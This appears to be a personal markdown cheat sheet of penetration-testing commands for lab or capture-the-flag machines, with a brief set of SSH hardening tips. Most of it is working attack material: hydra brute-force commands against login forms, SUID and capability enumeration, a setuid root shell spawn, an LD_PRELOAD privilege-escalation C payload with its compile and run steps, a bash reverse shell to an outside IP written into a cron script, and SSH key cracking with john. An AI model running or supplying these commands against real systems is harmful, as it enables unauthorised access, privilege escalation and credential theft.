
### Hydra Commands

```bash
hydra -L usernames.txt -P passwords.txt -v 10.10.80.98 http-post-form "/login.php:username=^USER^&password=^PASS^:Please enter the correct credentials"
```
Without a username 
```bash
hydra -l '' -P 3digits.txt -f -v 10.10.177.254 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

### SSH Security Configuration Recommendations

SSH is the service that faces most of the outside attacks. Securing it is a top priority. Linux servers arrive from the manufacturer with SSH services. There’s plenty here you can configure for increasing security, but these are what we recommend you to start from:

- SSH default port is Port 22. Port 22 is known to have several vulnerabilities, so you better change the default configurations.
- Make sure that the Root account is inaccessible using SSH:
    ```bash
    PermitRootLogin no
    ```
- Password authentication must be replaced with key-based authentication. All this can be configured from /etc/ssh/sshd_config
- Allow some specific users:
    ```bash
    AllowUsers [Username]
    ```

This is just the tip of the ice when configuring SSH, and there is much more you can do. For example, some companies add banners to deter attackers and discourage them from continuing further.

### Important Command linux priviledge escaltion 

```find / -user root -perm /4000
find / -type f -perm /4000
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -user root -perm /4000
find / -type f -perm /4000
find / -type f -perm -04000 -ls 2>/dev/null 
```

## Capibilties

``` getcap -r / 2>/dev/null
```

## Spawing a python shell where you can use clear screen command 
```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```


## Finding a particular file 
```
find / -type f -name root.txt 2> /dev/null
```

### Showmount Command

Use the showmount command to see if the remote machine is sharing anything across the network:

```bash
showmount -e <remote-ip>
```

### LD_PRELOAD Environment Exploitation

1. Type: sudo -l
2. Notice that the LD_PRELOAD environment variable is intact.
3. Exploitation:
    ```bash
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
    }
    ```
    - Save the file as x.c
    ```bash
    gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
    sudo LD_PRELOAD=/tmp/x.so apache2
    ```

### Reverse Shell Command

When the Python shell is obtained, you can use the following command to edit the crontab file then use below comamnd :
```bash
echo "bash -c 'bash -i >& /dev/tcp/10.17.88.198/1234 0>&1'" > root.sh
```

### Different Types of Base to identify 

- Base2: 01100010 01110010 01100101 01100001 01101011 01101001 01110100
- Base8: 142 162 145 141 153 151 164
- Base16: 62 72 65 61 6b 69 74
- Base32: MJZGKYLLNF2A====
- Base58: 4jP4KDubX1
- Base62: 22udqyscMu
- Base64: YnJlYWtpdA==
- Base85: @WH$gCM@k
- Base91: %zmfv;:YH

### SSH2John and John Commands

```bash
sudo ssh2john idrsa.id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
```
### Disclaimer 🚨

⚠️ **Disclaimer:** The above content is not owned by me. It has been sourced from the internet for educational purposes only. I do not claim ownership or responsibility for the content provided. Please use it responsibly and in accordance with applicable laws and ethical guidelines.

